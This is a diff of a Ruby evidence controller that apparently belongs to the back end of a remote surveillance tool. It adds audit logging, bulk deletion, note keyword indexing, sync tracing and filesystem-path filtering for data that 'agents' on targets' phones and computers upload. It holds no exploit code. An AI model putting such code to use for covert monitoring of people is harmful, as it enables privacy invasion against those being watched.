@@ -6,6 +6,7 @@ require_relative '../db_layer'
 require_relative '../evidence_manager'
 require_relative '../evidence_dispatcher'
 require_relative '../position_resolver'
+require_relative '../connectors'
 
 # rcs-common
 require 'rcs-common/symbolize'
@@ -44,9 +45,6 @@ class EvidenceController < RESTController
 
       # update the evidence statistics
       StatsManager.instance.add evidence: 1, evidence_size: @request[:content]['content'].bytesize
-
-      # notify the worker
-      RCS::DB::EvidenceDispatcher.instance.notify id, shard_id, ident, instance
     rescue Exception => e
       trace :warn, "Cannot save evidence: #{e.message}"
       trace :fatal, e.backtrace.join("\n")
@@ -68,9 +66,14 @@ class EvidenceController < RESTController
       @params.delete('_id')
       @params.delete('target')
 
-      trace :fatal, "CANNOT MODIFY DATA #{@params['data']}" if @params.has_key? 'data'
-
+      # data cannot be modified !!!
       @params.delete('data')
+
+      # keyword index for note
+      if @params.has_key? 'note'
+        evidence[:kw] += @params['note'].keywords
+        evidence.save
+      end
 
       @params.each_pair do |key, value|
         if evidence[key.to_s] != value
@@ -115,14 +118,36 @@ class EvidenceController < RESTController
 
       evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
       agent = Item.find(evidence[:aid])
-      agent.stat.evidence[evidence.type] -= 1
+      agent.stat.evidence[evidence.type] -= 1 if agent.stat.evidence[evidence.type]
       agent.stat.size -= evidence.data.to_s.length
       agent.stat.grid_size -= evidence.data[:_grid_size] unless evidence.data[:_grid].nil?
       agent.save
+
+      Audit.log :actor => @session[:user][:name], :action => 'evidence.destroy', :desc => "Deleted evidence #{evidence.type} #{evidence[:_id]}"
+
       evidence.destroy
 
       return ok
     end
+  end
+
+  def destroy_all
+    require_auth_level :admin
+
+    return conflict("Unable to delete") unless LicenseManager.instance.check :deletion
+
+    Audit.log :actor => @session[:user][:name], :action => 'evidence.destroy',
+              :desc => "Deleted multi evidence from: #{Time.at(@params['from'])} to: #{Time.at(@params['to'])} relevance: #{@params['rel']} type: #{@params['type']}"
+
+    trace :debug, "Deleting evidence: #{@params}"
+
+    task = {name: "delete multi evidence",
+            method: "::Evidence.offload_delete_evidence",
+            params: @params}
+
+    OffloadManager.instance.run task
+
+    return ok
   end
 
   def body
@@ -151,6 +176,8 @@ class EvidenceController < RESTController
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
+
+    trace :info, "#{agent[:name]} sync started [#{agent[:ident]}:#{agent[:instance]}]"
 
     # update the agent version
     agent.version = @params['version']
@@ -202,6 +229,8 @@ class EvidenceController < RESTController
     ev[:data] = {content: address}
     ev[:data] = ev[:data].merge(position)
     ev.save
+
+    Connectors.new_evidence(ev)
   end
 
   # used by the collector to update the synctime during evidence transfer
@@ -214,6 +243,8 @@ class EvidenceController < RESTController
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
+
+    trace :info, "#{agent[:name]} sync update [#{agent[:ident]}:#{agent[:instance]}]"
 
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
@@ -253,6 +284,8 @@ class EvidenceController < RESTController
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
+
+    trace :info, "#{agent[:name]} sync end [#{agent[:ident]}:#{agent[:instance]}]"
 
     agent.stat[:last_sync] = Time.now.getutc.to_i
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
@@ -297,10 +330,10 @@ class EvidenceController < RESTController
       if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
         start_index = @params['startIndex'].to_i
         num_items = @params['numItems'].to_i
-        query = filtering.where(filter_hash).without(:body).order_by([[:_id, :asc]]).skip(start_index).limit(num_items)
+        query = filtering.where(filter_hash).without(:body, :kw).order_by([[:_id, :asc]]).skip(start_index).limit(num_items)
       else
         # without paging, return everything
-        query = filtering.where(filter_hash).without(:body).order_by([[:_id, :asc]])
+        query = filtering.where(filter_hash).without(:body, :kw).order_by([[:_id, :asc]])
       end
 
       return ok(query, {gzip: true})
@@ -390,6 +423,8 @@ class EvidenceController < RESTController
 
     mongoid_query do
 
+      start = Time.now
+
       # filter by target
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found") if target.nil?
@@ -404,12 +439,27 @@ class EvidenceController < RESTController
       filtering = Evidence.collection_class(target[:_id]).where({:type => 'filesystem'})
       filtering = filtering.any_in(:aid => [agent[:_id]]) unless agent.nil?
 
-      # perform de-duplication and sorting at app-layer and not in mongo
-      # because the data set can be larger the mongo is able to handle
-      data = filtering.to_a
+      if @params['filter']
 
+        #filter = @params['filter']
+
+        # complete the request with some regex magic...
+        filter = "^" + Regexp.escape(@params['filter']) + "[^\\\\\\\/]+$"
+
+        # special case if they request the root
+        filter = "^[[:alpha:]]:$" if @params['filter'] == "[root]" and ['windows', 'winmo', 'symbian'].include? agent.platform
+        filter = "^\/$" if @params['filter'] == "[root]" and ['blackberry', 'android', 'osx', 'ios', 'linux'].include? agent.platform
+
+        filtering = filtering.and({"data.path".to_sym => Regexp.new(filter, Regexp::IGNORECASE)})
+      end
+
+      # perform de-duplication and sorting at app-layer and not in mongo
+      # because the data set can be larger than mongo is able to handle
+      data = filtering.to_a
       data.uniq! {|x| x[:data]['path']}
       data.sort! {|x, y| x[:data]['path'].downcase <=> y[:data]['path'].downcase}
+
+      trace :debug, "Filesystem request #{filter} resulted in #{data.size} entries"
 
       return ok(data)
     end
